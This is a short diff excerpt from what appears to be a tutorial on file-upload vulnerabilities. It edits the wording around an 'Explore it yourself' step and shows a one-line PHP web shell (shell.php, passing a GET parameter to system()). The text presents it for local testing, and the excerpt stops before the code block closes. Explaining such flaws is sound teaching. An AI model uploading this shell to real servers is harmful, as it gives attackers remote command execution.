@@ -21,8 +21,9 @@ The other class of problem is with the file size or content. The range of proble
 
 The impact of this vulnerability is high, supposed code can be executed in the server context or on the client side. The likelihood of detection for the attacker is high. The prevalence is common. As a result the severity of this type of vulnerability is high.
 ### Explore it yourself :
- make a PHP file to test the vulnerability locally in your system with the code mentioned here.
- ## shell.php
+ Make a PHP file to test the vulnerability locally in your system with the code mentioned here.
+ 
+  shell.php
 ```php
 <?php
 echo system($_GET["cmd"]);
